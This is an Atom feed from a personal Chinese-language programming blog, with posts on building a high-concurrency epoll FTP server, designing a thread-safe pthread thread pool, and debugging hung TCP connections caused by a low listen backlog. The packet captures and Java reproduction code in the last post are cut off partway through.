<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>H-ZeX</title>
  
  <subtitle>H-ZeX&#39;s Coding Life</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://h-zex.github.io/"/>
  <updated>2019-03-20T15:44:31.739Z</updated>
  <id>https://h-zex.github.io/</id>
  
  <author>
    <name>H-ZeX</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>开发一个高并发的FTP服务器</title>
    <link href="https://h-zex.github.io/2019/03/20/%E5%BC%80%E5%8F%91%E4%B8%80%E4%B8%AA%E9%AB%98%E5%B9%B6%E5%8F%91%E7%9A%84FTP%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>https://h-zex.github.io/2019/03/20/开发一个高并发的FTP服务器/</id>
    <published>2019-03-20T13:58:41.000Z</published>
    <updated>2019-03-20T15:44:31.739Z</updated>
    
    <content type="html"><![CDATA[<h3 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h3><ul><li>根据RFC959</li><li>高并发</li></ul><h3 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h3><ul><li><p>在主线程使用epoll，监听listen在21端口的fd，和所有用户的命令链接的fd（以下均以cmdFd简称之）</p></li><li><p>一旦某个fd就绪，就将其封装成任务对象提交给线程池去执行</p></li><li><p>每个用户关联一个Session对象，根据RFC的要求，可以实现为，任意时刻只有小于等于一个线程在handle这个session对象</p></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ tree src/main </span><br><span class="line">src/main</span><br><span class="line">├── config</span><br><span class="line">│   └── config.hpp</span><br><span class="line">├── core</span><br><span class="line">│   ├── FTP.hpp</span><br><span class="line">│   ├── Login.hpp</span><br><span class="line">│   ├── NetworkManager.hpp</span><br><span class="line">│   └── Session.hpp</span><br><span class="line">├── main.cpp</span><br><span class="line">├── tools</span><br><span class="line">│   ├── FileSystem.hpp</span><br><span class="line">│   ├── ListFiles.hpp</span><br><span class="line">│   └── ThreadPool.hpp</span><br><span class="line">└── util</span><br><span class="line">    ├── Def.hpp</span><br><span class="line">    ├── NetUtility.hpp</span><br><span class="line">    ├── ThreadUtility.hpp</span><br><span class="line">    └── Utility.hpp</span><br></pre></td></tr></table></figure></li></ul><h3 id="线程安全的线程池类的设计"><a href="#线程安全的线程池类的设计" class="headerlink" title="线程安全的线程池类的设计"></a>线程安全的线程池类的设计</h3><ul><li>见笔者的另一篇博文<a href="https://h-zex.github.io/2019/03/20/%E6%9E%84%E9%80%A0%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E7%9A%84ThreadPool/">构造一个线程安全的ThreadPool</a></li></ul><h3 id="Utility"><a href="#Utility" class="headerlink" title="Utility"></a>Utility</h3><ul><li><p>对于POSIX的 read、write等IO函数、accept等网络函数、epoll、pthread等函数创建wrap函数，用于处理各种错误，使得业务方可以简单的使用</p></li><li><p>要根据manual，对所有可能出现的errno进行处理。我的处理方法是，对于可以明确知道不应该出现的errno，一旦出现，就调用bug函数；对于EINTR，根据需求进行再次尝试或返回；对于不明确是否是合法情况的错误，输出一个warning，然后不改变errno，返回给用户；尽量使得这些wrap函数不需要返回过于复杂的信息，能返回void尽量返回void，能返回bool就不要返回int</p></li><li><p><code>ReadWithBuf</code>函数：学的是CSAPP的方法，让用户每次调用都传入一个相同的<code>ReadBuf</code>对象，在这个对象里存预读取的数据，这样子就可以每次读都读1024B（ReadBuf里面的buf的大小是1024B），从而减少read这个syscall调用的次数，可以提高效率</p></li></ul><h3 id="FTP类"><a href="#FTP类" class="headerlink" title="FTP类"></a>FTP类</h3><ul><li><p>FTP类需要保证很重要的一点：任意一个session在任意一个时刻，只有小于等于1个线程正在handle该Session</p></li><li><p>在代码里我是这样保证的</p><ul><li><p>对于用户的cmdFd，epoll等待的事件不仅仅是<code>EPOLLIN</code>，还需要<code>EPOLLONESHOT</code>。<code>EPOLLONESHOT</code>的含义是，一旦一个Fd被从<code>epoll_wait</code>返回，那么其就不再从<code>epoll_wait</code>返回，即使有事件发生。直到用户对这个fd使用<code>EPOLL_CTL_MOD</code>调用<code>epoll_ctl</code>指示等待的事件</p><blockquote><p>EPOLLONESHOT (since Linux 2.6.2) Sets the one-shot behavior for the associated file descriptor. This means that after an event is pulled out with epoll_wait(2) the associated file descriptor is internally disabled and no other events will be reported by the epoll interface. The user must call epoll_ctl() with EPOLL_CTL_MOD to rearm the file descriptor with a new event mask. </p></blockquote><p>从而使得，一个Session正在被handle的过程中，没有新的线程会去handle这个Session</p></li><li><p>创建新Session的函数epoll_wait、accept的函数在同一个线程，从而在创建新Session时，不会有新的线程去handle这个正在创建的Session</p></li><li><p>destroySession时，持有一个mutex，从而，即使对应的cmdFd关闭了，<strong>OS复用了这个fd</strong>，但是其创建新Session会被阻塞，从而在该Session完全destroy之前，没有新线程会handle该Session</p></li></ul></li></ul><h2 id="压测"><a href="#压测" class="headerlink" title="压测"></a>压测</h2><h4 id="压测步骤"><a href="#压测步骤" class="headerlink" title="压测步骤"></a>压测步骤</h4><ul><li><p>笔者的压测程序使用java写的，代码在这里<a href="https://github.com/H-ZeX/FTP-Implement/tree/master/test/FTPServerTester" target="_blank" rel="noopener">https://github.com/H-ZeX/FTP-Implement/tree/master/test/FTPServerTester</a></p></li><li><p>压测前，运行server的命令是`</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ulimit -s unlimited -f unlimited -d unlimited -n unlimited </span><br><span class="line">sudo ./FTPServer [port]  &gt; /tmp/FTPServerOutput</span><br></pre></td></tr></table></figure><p>将stdout重定向到<code>/tmp/FTPServerOutput</code>是为了使得错误信息清晰的显示出来</p><p>之所以需要<code>sudo</code>，是因为使用了OS的账户验证机制来实现用户登录，如果没有<code>sudo</code>，则会导致程序打印报bug并退出</p><p><code>./FTPServer [port]</code>的<code>[port]</code>参数可以不指定，也就是直接<code>sudo ./FTPServer  &gt; /tmp/FTPServerOutput</code>,这样将会监听在<code>8001</code>端口</p></li><li><p>然后运行<code>java  -ea -jar -Dexternal.config=file:/tmp/1.properties FTPServerTester-1.0-SNAPSHOT.jar</code></p><p><code>FTPServerTester-1.0-SNAPSHOT.jar</code>在根目录的<code>test</code>目录下（不是在<code>src/test</code>的那个<code>test</code>目录）</p><p><code>/tmp/1.properties</code>是配置文件，因为需要包含测试账户信息，所以需要自己定制，样例如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">StressTest.TestCnt=10</span><br><span class="line">StressTest.MaxCmdConnectionCnt=1000</span><br><span class="line">StressTest.MaxThreadCnt=1024</span><br><span class="line"># the time(millisecond) to hand on the connection</span><br><span class="line">StressTest.HangTime=1000</span><br><span class="line">Tester.TesterServerAddress=127.0.0.1</span><br><span class="line">Tester.ServerPort=8001</span><br><span class="line">Tester.UserName=</span><br><span class="line">Tester.Password=</span><br><span class="line">#（这些目录必须是当前不存在的，并且必须是绝对路径）</span><br><span class="line"># this is the list of dirs that split by comma</span><br><span class="line">Tester.ListTestDir=/tmp/testDir_1,/tmp/testDir_2,/tmp/testDir_3,/tmp/testDir_4,/tmp/testDir_5,/tmp/testDir_6,/tmp/testDir_7,/tmp/testDir_8,/tmp/testDir_9,/tmp/testDir_10,/tmp/testDir_11,/tmp/testDir_12,/tmp/testDir_13,/tmp/testDir_14,/tmp/testDir_15,/tmp/testDir_16,/tmp/testDir_17</span><br><span class="line"># this is one dir </span><br><span class="line">#（这个目录必须是当前不存在的，并且必须是绝对路径）</span><br><span class="line">Tester.StorTestDir=/tmp/FTPSeverTesterStorDirs____23233dd22/</span><br></pre></td></tr></table></figure></li></ul><h4 id="压测结果"><a href="#压测结果" class="headerlink" title="压测结果"></a>压测结果</h4><ul><li>笔者在自己的机器上，<code>StressTest.MaxCmdConnectionCnt</code>设为<code>10240</code>及以下时，测试可以顺利完成。并且在测试过程使用linux的<code>ftp</code>命令与server通信，是比较流畅的</li></ul><h2 id="出现的问题"><a href="#出现的问题" class="headerlink" title="出现的问题"></a>出现的问题</h2><ul><li><p>测试程序开50k个链接连server进行操作（50k个测试是依次提交给线程池，边提交线程池边运行），server需要openListenFd，由OS指定端口，但是在测试程序成功进行了15k多一点的测试后，server的这个openListenFd失败，errno是<code>Address already in use</code>。</p><p><strong>我猜测</strong>，可能是很多端口处于<code>TIME_WAIT</code>状态，虽然打开的socket设置了<code>SO_REUSEADDR</code>，可以绑定这些TIME_WAIT链接的端口，但是刚好，对端也是上一次那个链接的端口，这是TCP禁止的——TCP允许复用处于TIME_WAIT的端口，但是不允许新的链接与TIME_WAIT的链接的(serverIp, serverPort, serverIp, serverPort)相同（其实也不是一定禁止，TCP规范是允许有例外），所以就提示<code>Address already in use</code></p></li><li><p>server listen的端口的backlog设太小（20），测试程序开的链接数一多，就有一些链接三次握手成功，但是hang住在读取welcome信息那里，详见笔者的另一篇博文<a href="https://h-zex.github.io/2019/03/19/%E9%AB%98%E5%B9%B6%E5%8F%91%E6%83%85%E5%86%B5%E4%B8%8Bbacklog%E8%BF%87%E4%BD%8E%E5%87%BA%E7%8E%B0%E7%9A%84%E9%97%AE%E9%A2%98/">高并发情况下backlog过低出现的问题</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;需求&quot;&gt;&lt;a href=&quot;#需求&quot; class=&quot;headerlink&quot; title=&quot;需求&quot;&gt;&lt;/a&gt;需求&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;根据RFC959&lt;/li&gt;
&lt;li&gt;高并发&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;架构&quot;&gt;&lt;a href=&quot;#架构&quot; class
      
    
    </summary>
    
      <category term="网络编程" scheme="https://h-zex.github.io/categories/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
    
      <category term="并发编程" scheme="https://h-zex.github.io/categories/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="FTP 服务器" scheme="https://h-zex.github.io/tags/FTP-%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    
      <category term="高并发" scheme="https://h-zex.github.io/tags/%E9%AB%98%E5%B9%B6%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>构造一个线程安全的ThreadPool</title>
    <link href="https://h-zex.github.io/2019/03/20/%E6%9E%84%E9%80%A0%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E7%9A%84ThreadPool/"/>
    <id>https://h-zex.github.io/2019/03/20/构造一个线程安全的ThreadPool/</id>
    <published>2019-03-20T01:58:41.000Z</published>
    <updated>2019-03-20T10:12:32.736Z</updated>
    
    <content type="html"><![CDATA[<h2 id="构造一个线程安全的ThreadPool"><a href="#构造一个线程安全的ThreadPool" class="headerlink" title="构造一个线程安全的ThreadPool"></a>构造一个线程安全的ThreadPool</h2><h4 id="线程安全的两个要点"><a href="#线程安全的两个要点" class="headerlink" title="线程安全的两个要点"></a>线程安全的两个要点</h4><ul><li><p>原子性：一组操作要么不执行，要么完全执行</p></li><li><p>内存可见性：一个线程对于某个对象、变量的修改对于另一个线程是否可见，什么时候可见，该数据可见时其他数据的的可见情况</p></li></ul><h4 id="使用pthread时保证内存可见性"><a href="#使用pthread时保证内存可见性" class="headerlink" title="使用pthread时保证内存可见性"></a>使用pthread时保证内存可见性</h4><ul><li><p>由于笔者对pthread的内存模型不熟悉、不清楚c++中的<code>volatile</code>语义是否编译器相关的，所以，在构造这个ThreadPool时不敢使用<code>volatile</code>等来实现内存可见性。而是通过加锁以充当内存屏障来实现——虽然性能上会受到影响，但是至少可以保证正确性</p></li><li><p>pthread创建线程时，传递的<code>start_routine</code>参数必须是static方法，这意味着，需要把ThreadPool的<code>this</code>指针传递过去。但是，一个严重的问题，<code>this</code>指针是在原线程初始化的，ThreadPool对象也是在原线程构造的，那么，如何保证新线程看到一致的、正确构造的ThreadPool对象？在java内存模型中，这是无法保证的，必须使用其他办法来保证（<code>volatile</code>、<code>final</code>、<code>AtomicReference</code>等）。笔者不清楚pthread是否可以保证传递过去的参数的内存可见性，虽然实验中，clang++7开<code>-O3</code>，测试了5k多次，在另一个线程都可以看到正确的对象，但是因为不确定这是否是编译器相关的。所以，笔者使用了一个全局mutex，充当内存屏障——每次写该变量时持有该mutex，每次读时也要持有，以保证新线程可以看到正确构造的、一致的对象</p></li><li><p>有另一个问题，mutex对象的内存可见性如何保证？按照JCIP（java concurrency in practice）的说法，即使是一个线程安全的对象，也需要被安全的发布（发布（publish）：使对象能够在当前作用域之外的代码中使用）。保护this指针的mutex是全局变量，那么我认为其可见性应该是可以保证的，因为在编译期就已经初始化完成该mutex（欢迎指正！）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">pthread_mutex_t</span> poolPtrAndSigToBlockMutex = PTHREAD_MUTEX_INITIALIZER;</span><br></pre></td></tr></table></figure><p>而对于那些是类内变量（非static）的mutex，因为每次获得threadPool对象时，都是在持有该mutex时解引用<code>this</code>指针，所以我认为可以保证另一个线程可以看到完整的、一致的对象（欢迎指正！）</p></li></ul><h4 id="this指针逸出问题"><a href="#this指针逸出问题" class="headerlink" title="this指针逸出问题"></a><code>this</code>指针逸出问题</h4><ul><li>根据JCIP，逸出（escape）的含义是在对象构造完成前就发布该对象，从而另一个线程看到一个没有完全构造的对象</li><li>如果在构造函数里启动线程，那么就是典型的<code>this</code>指针逸出——在构造函数还没运行完前，另一个线程就已经看到了<code>this</code>指针，从而看到了一个没有完全构造的对象</li><li>解决方法是使用一个start函数，用户获得ThreadPool实例后，手动调用start方法，以启动工作线程</li></ul><h4 id="状态转换的证明"><a href="#状态转换的证明" class="headerlink" title="状态转换的证明"></a>状态转换的证明</h4><ul><li><p>ThreadPool需要维护自己当前处于哪一个状态</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NEW, RUNNING, GRACEFUL_SHUTDOWN, IMMEDIATE_SHUTDOWN</span><br></pre></td></tr></table></figure><p>并且保证程序中只有合法的状态转移。这需要证明。</p></li><li><p>在我的实现的线程池中，状态的转换是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NEW-&gt;RUNNING-&gt;GRACEFUL_SHUTDOWN or IMMEDIATE_SHUTDOWN</span><br><span class="line">or</span><br><span class="line">NEW-&gt;GRACEFUL_SHUTDOWN or IMMEDIATE_SHUTDOWN</span><br></pre></td></tr></table></figure><p>证明是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">In the constructor, the state is set to NEW.</span><br><span class="line">In the start method, the state is set to RUNNING.</span><br><span class="line">In the shutdown method, the state set to GRACEFUL_SHUTDOWN or IMMEDIATE_SHUTDOWN.</span><br><span class="line"></span><br><span class="line">proof of the state transformation safety.</span><br><span class="line">For any instance of this ThreadPool,</span><br><span class="line">the constructor run only one time,</span><br><span class="line">so for any instance, if it is not NEW state,</span><br><span class="line">it will never be NEW state.</span><br><span class="line">After the shutdown method is called,</span><br><span class="line">no other public method except destructor and getInstance can be called,</span><br><span class="line">so if it is shutdown state, it will always be shutdown state.</span><br><span class="line">Every time the state is modify, it is protected by taskQueAndStateMutex,</span><br><span class="line">so there is no thread safety problem.</span><br></pre></td></tr></table></figure></li></ul><h4 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h4><ul><li><p>因为使用了全局变量mutex，所以这个类只能是单例模式</p></li><li><p>在java中，有一个DCL（double check locking），其代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Object instance = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (instance == <span class="keyword">null</span>)</span><br><span class="line">        instance = <span class="keyword">new</span> Object();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> instance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个写法有个问题，另一个线程可能看到一个<code>instance</code>引用已经被初始化完成，但是对象构造函数还未完成的对象——因为内存重排序，编译器可以先初始化引用再完成构造函数的运行</p></li><li><p>因为不清楚pthread是否也会有这种问题，所以对于获得ThreadPool实例的<code>getInstance</code>方法，每次都要加锁，然后才检查instance指针</p></li></ul><h4 id="使用条件变量的注意事项"><a href="#使用条件变量的注意事项" class="headerlink" title="使用条件变量的注意事项"></a>使用条件变量的注意事项</h4><ul><li><p>wait Condition变量前要检查条件是否满足，否则可能出现：条件以满足，所以生产者不再notify，然后消费者就一直hang在cond wait那里</p></li><li><p>检查条件时要使用<code>while</code>而不是<code>if</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 正面例子</span></span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">not</span> satify condition) &#123;</span><br><span class="line">    cond.wait()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反面例子</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">not</span> satify condition) &#123;</span><br><span class="line">    cond.wait</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个很重要的原因：某个线程正在等待，然后被唤醒，这时候，突然一个新线程（该线程之前并没有在等待该cond）进来，拿走了资源，结果醒来的线程拿不到资源，所以应该继续等。另外wiki（<a href="https://en.wikipedia.org/wiki/Spurious_wakeup" target="_blank" rel="noopener">Spurious wakeup</a>）上还讲了另一个原因，就是说在现代处理器上，要保证没有假醒需要较高的代价。不过，JCIP（java concurrency in practice）上虽然有打比方说“因为线路故障导致烤面包机提前响起”，但是没有明确说存在这种硬件上导致的假醒</p></li></ul><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><ul><li>链接：<a href="https://github.com/H-ZeX/FTP-Implement/blob/master/src/main/tools/ThreadPool.hpp" target="_blank" rel="noopener">https://github.com/H-ZeX/FTP-Implement/blob/master/src/main/tools/ThreadPool.hpp</a></li><li>测试代码链接：<a href="https://github.com/H-ZeX/FTP-Implement/blob/master/src/test/tools/ThreadPoolTest.hpp" target="_blank" rel="noopener">https://github.com/H-ZeX/FTP-Implement/blob/master/src/test/tools/ThreadPoolTest.hpp</a></li><li>代码依赖于项目中的基础设施，所以不能直接使用</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;构造一个线程安全的ThreadPool&quot;&gt;&lt;a href=&quot;#构造一个线程安全的ThreadPool&quot; class=&quot;headerlink&quot; title=&quot;构造一个线程安全的ThreadPool&quot;&gt;&lt;/a&gt;构造一个线程安全的ThreadPool&lt;/h2&gt;&lt;h4 i
      
    
    </summary>
    
      <category term="并发编程" scheme="https://h-zex.github.io/categories/%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="原子性" scheme="https://h-zex.github.io/tags/%E5%8E%9F%E5%AD%90%E6%80%A7/"/>
    
      <category term="线程安全" scheme="https://h-zex.github.io/tags/%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8/"/>
    
      <category term="线程池" scheme="https://h-zex.github.io/tags/%E7%BA%BF%E7%A8%8B%E6%B1%A0/"/>
    
      <category term="内存可见性" scheme="https://h-zex.github.io/tags/%E5%86%85%E5%AD%98%E5%8F%AF%E8%A7%81%E6%80%A7/"/>
    
  </entry>
  
  <entry>
    <title>高并发情况下backlog过低出现的问题</title>
    <link href="https://h-zex.github.io/2019/03/19/%E9%AB%98%E5%B9%B6%E5%8F%91%E6%83%85%E5%86%B5%E4%B8%8Bbacklog%E8%BF%87%E4%BD%8E%E5%87%BA%E7%8E%B0%E7%9A%84%E9%97%AE%E9%A2%98/"/>
    <id>https://h-zex.github.io/2019/03/19/高并发情况下backlog过低出现的问题/</id>
    <published>2019-03-19T13:58:41.000Z</published>
    <updated>2019-03-19T17:17:57.636Z</updated>
    
    <content type="html"><![CDATA[<h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><ul><li>最近重构一个以前写的FTP Server，压测时，服务器的backlog是20，然后client总是有一些链接，已经<code>new Socket()</code>成功（根据测试，这意味着三次握手完成），但是就是收不到welcome信息，服务端的log看到的accept的链接数目少于client打开的链接数目(服务端的accept也没有报错)，少的数量刚好是client端hang住在读welcome信息那些链接的数目。后来尝试了调整<code>ulimit</code>无果，调整了backlog后就好了。看起来就像是一些链接被悄无声息（没有返回FIN或RST之类的报文）地从 等待被应用accept的队列 移除。</li><li>我抽查的十几个hang住的端口对应的报文都是三次握手成功，然后还hang住时是没有新的报文的，client一关闭，发送了FIN后，一种情况是，server端就发送数据给client，另一种情况是server端对client的FIN报文返回RST。</li><li><p>报文如下</p><ul><li><p>第一种情况的报文，这种是client hang住没多久就关掉整个client进程时出现的情况</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> 117890 271.658989117  127.0.0.1             127.0.0.1             TCP      74     [TCP Port numbers reused] 40900 → 8083 [SYN, ECN, CWR] Seq=0 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298647083 TSecr=0 WS=128</span><br><span class="line"> 201498 272.673187012  127.0.0.1             127.0.0.1             TCP      74     [TCP Retransmission] 40900 → 8083 [SYN] Seq=0 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298648097 TSecr=0 WS=128</span><br><span class="line"> 201591 272.673232077  127.0.0.1             127.0.0.1             TCP      74     8083 → 40900 [SYN, ACK] Seq=0 Ack=1 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298648068 TSecr=298648097 WS=128</span><br><span class="line"> 201643 272.673288084  127.0.0.1             127.0.0.1             TCP      66     40900 → 8083 [ACK] Seq=1 Ack=1 Win=43776 Len=0 TSval=298648097 TSecr=298648068</span><br><span class="line"> 203783 297.152188039  127.0.0.1             127.0.0.1             TCP      66     40900 → 8083 [FIN, ACK] Seq=1 Ack=1 Win=43776 Len=0 TSval=298672576 TSecr=298648068</span><br><span class="line"> 203823 297.152451323  127.0.0.1             127.0.0.1             TCP      73     8083 → 40900 [PSH, ACK] Seq=1 Ack=2 Win=29312 Len=7 TSval=298672576 TSecr=298672576</span><br><span class="line">0000  68 65 6c 6c 6f 0d 0a                              hello..</span><br><span class="line"> 203825 297.152464118  127.0.0.1             127.0.0.1             TCP      54     40900 → 8083 [RST] Seq=2 Win=0 Len=0</span><br></pre></td></tr></table></figure></li><li><p>第二种情况的报文，这种是client hang住很久才关掉整个client进程时出现的情况</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> 21004 108.400081512  127.0.0.1             127.0.0.1             TCP      74     46538 → 8083 [SYN, ECN, CWR] Seq=0 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298483826 TSecr=0 WS=128</span><br><span class="line"> 92060 109.409186851  127.0.0.1             127.0.0.1             TCP      74     [TCP Retransmission] 46538 → 8083 [SYN] Seq=0 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298484836 TSecr=0 WS=128</span><br><span class="line"> 92108 109.409228584  127.0.0.1             127.0.0.1             TCP      74     8083 → 46538 [SYN, ACK] Seq=0 Ack=1 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298484804 TSecr=298484836 WS=128</span><br><span class="line"> 92155 109.409268850  127.0.0.1             127.0.0.1             TCP      66     46538 → 8083 [ACK] Seq=1 Ack=1 Win=43776 Len=0 TSval=298484836 TSecr=298484804</span><br><span class="line">112908 254.340209126  127.0.0.1             127.0.0.1             TCP      66     46538 → 8083 [FIN, ACK] Seq=1 Ack=1 Win=43776 Len=0 TSval=298629764 TSecr=298484804</span><br><span class="line">112909 254.340214301  127.0.0.1             127.0.0.1             TCP      54     8083 → 46538 [RST] Seq=1 Win=0 Len=0</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><ul><li><p>server</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.ServerSocket;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Executor;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Executors;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBacklogServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Executor executor = Executors.newFixedThreadPool(<span class="number">128</span>);</span><br><span class="line">        ServerSocket socket = <span class="keyword">new</span> ServerSocket(<span class="number">8083</span>, <span class="number">10</span>);</span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">final</span> Socket client = socket.accept();</span><br><span class="line">            System.out.println(cnt + <span class="string">": accept one: "</span> + client.getRemoteSocketAddress());</span><br><span class="line">            cnt++;</span><br><span class="line">            executor.execute(() -&gt; &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    client.getOutputStream().write(<span class="string">"hello\r\n"</span>.getBytes());</span><br><span class="line">                    client.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>client。之所以设置了timeout，是为了拿到hang住的端口号，测试时可以不设置timeout，然后在没有新的输出时，threadDump，可以看到有多个链接hang在read那里</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 